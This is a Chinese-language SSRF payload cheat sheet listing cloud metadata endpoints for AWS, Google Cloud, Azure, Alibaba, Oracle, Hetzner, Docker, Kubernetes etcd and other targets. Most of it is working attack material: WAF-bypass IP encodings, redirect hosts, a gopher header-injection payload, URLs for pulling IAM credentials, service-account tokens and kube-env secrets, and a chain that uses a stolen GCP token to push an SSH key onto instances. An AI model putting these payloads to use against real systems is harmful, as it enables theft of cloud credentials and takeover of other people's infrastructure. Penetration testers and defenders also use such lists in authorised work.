# 云实例的SSRF URL

> 在云环境中利用服务器端请求伪造(SSRF)时，攻击者通常以元数据端点为攻击目标，以检索敏感实例信息（如凭证、配置）。以下是各种云和基础设施提供商的常见URL分类列表。

## 目录

* [AWS Bucket的SSRF URL](#aws-bucket的ssrf-url)
* [AWS ECS的SSRF URL](#aws-ecs的ssrf-url)
* [AWS Elastic Beanstalk的SSRF URL](#aws-elastic-beanstalk的ssrf-url)
* [AWS Lambda的SSRF URL](#aws-lambda的ssrf-url)
* [Google Cloud的SSRF URL](#google-cloud的ssrf-url)
* [Digital Ocean的SSRF URL](#digital-ocean的ssrf-url)
* [Packetcloud的SSRF URL](#packetcloud的ssrf-url)
* [Azure的SSRF URL](#azure的ssrf-url)
* [OpenStack/RackSpace的SSRF URL](#openstackrackspace的ssrf-url)
* [HP Helion的SSRF URL](#hp-helion的ssrf-url)
* [Oracle Cloud的SSRF URL](#oracle-cloud的ssrf-url)
* [Kubernetes ETCD的SSRF URL](#kubernetes-etcd的ssrf-url)
* [Alibaba的SSRF URL](#alibaba的ssrf-url)
* [Hetzner Cloud的SSRF URL](#hetzner-cloud的ssrf-url)
* [Docker的SSRF URL](#docker的ssrf-url)
* [Rancher的SSRF URL](#rancher的ssrf-url)
* [参考资料](#参考资料)

## AWS Bucket的SSRF URL

AWS实例元数据服务是Amazon EC2实例内部可用的一项服务，允许这些实例访问有关自身的元数据。 - [文档](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

* IPv4端点（旧版）: `http://169.254.169.254/latest/meta-data/`
* IPv4端点（新版）需要请求头 `X-aws-ec2-metadata-token`

  ```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6端点: `http://[fd00:ec2::254]/latest/meta-data/`

如果存在WAF，您可能需要尝试不同的方式连接API。

* 指向AWS API IP的DNS记录

  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP重定向

  ```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* 编码IP以绕过WAF

  ```powershell
  http://425.510.425.510 带溢点的点分十进制
  http://2852039166 无点十进制
  http://7147006462 带溢点的无点十进制
  http://0xA9.0xFE.0xA9.0xFE 点分十六进制
  http://0xA9FEA9FE 无点十六进制
  http://0x41414141A9FEA9FE 带溢点的无点十六进制
  http://0251.0376.0251.0376 点分八进制
  http://0251.00376.000251.0000376 带填充的点分八进制
  http://0251.254.169.254 混合编码（点分八进制 + 点分十进制）
  http://[::ffff:a9fe:a9fe] 压缩的IPv6
  http://[0:0:0:0:0:ffff:a9fe:a9fe] 展开的IPv6
  http://[0:0:0:0:0:ffff:169.254.169.254] IPv6/IPv4
  http://[fd00:ec2::254] IPv6
  ```

这些URL返回与实例关联的IAM角色列表。然后，您可以将角色名称附加到此URL以检索该角色的安全凭证。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[角色名称]
```

此URL用于访问启动实例时指定的用户数据。用户数据通常用于将启动脚本或其他配置信息传递到实例中。

```powershell
http://169.254.169.254/latest/user-data
```

其他用于查询有关实例的各种元数据的URL，如主机名、公共IPv4地址和其他属性。

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**示例**:

* Jira SSRF导致AWS信息泄露 - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
* Flaws挑战 - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

## AWS ECS的SSRF URL

如果您对ECS实例具有文件系统访问权限的SSRF，请尝试提取`/proc/self/environ`以获取UUID。

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

这样您就可以提取附加角色的IAM密钥

## AWS Elastic Beanstalk的SSRF URL

我们从API检索`accountId`和`region`。

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们从API检索`AccessKeyId`、`SecretAccessKey`和`Token`。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们使用`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`与凭证一起使用。

## AWS Lambda的SSRF URL

AWS Lambda为自定义运行时提供了一个HTTP API，用于从Lambda接收调用事件并在Lambda执行环境中发送响应数据。

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

文档: <https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next>

## Google Cloud的SSRF URL

:warning: Google将于1月15日停止支持使用**v1元数据服务**。

需要请求头"Metadata-Flavor: Google"或"X-Google-Metadata-Request: True"

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google允许递归拉取

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta版目前不需要请求头（感谢Mathias Karlsson @avlidienbrunn）

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

可以使用带有以下技术的gopher SSRF设置所需的请求头

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

要提取的有趣文件：

* SSH公钥：`http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
* 获取访问令牌：`http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
* Kubernetes密钥：`http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

### 添加SSH密钥

提取令牌

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

检查令牌的范围

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

现在推送SSH密钥。

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## Digital Ocean的SSRF URL

文档位于 `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

一个请求获取所有信息:
curl http://169.254.169.254/metadata/v1.json | jq
```

## Packetcloud的SSRF URL

文档位于 `https://metadata.packet.net/userdata`

## Azure的SSRF URL

有限制，可能还有更多？ `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

2017年4月更新，Azure有更多支持；需要请求头"Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## OpenStack/RackSpace的SSRF URL

(需要请求头？未知)

```powershell
http://169.254.169.254/openstack
```

## HP Helion的SSRF URL

(需要请求头？未知)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## Oracle Cloud的SSRF URL

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## Alibaba的SSRF URL

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## Hetzner Cloud的SSRF URL

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## Kubernetes ETCD的SSRF URL

可能包含API密钥以及内部IP和端口

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## Docker的SSRF URL

```powershell
http://127.0.0.1:2375/v1.24/containers/json

简单示例
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

更多信息：

* 守护进程套接字选项: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>
* Docker引擎API: <https://docs.docker.com/engine/api/latest/>

## Rancher的SSRF URL

```powershell
curl http://rancher-metadata/<version>/<path>
```

更多信息: <https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/>

## 参考资料

* [通过Google收购中的SSRF提取AWS元数据 - tghawkins - 2017年12月13日](https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
* [利用AWS Elastic Beanstalk中的SSRF - Sunil Yadav - 2019年2月1日](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)
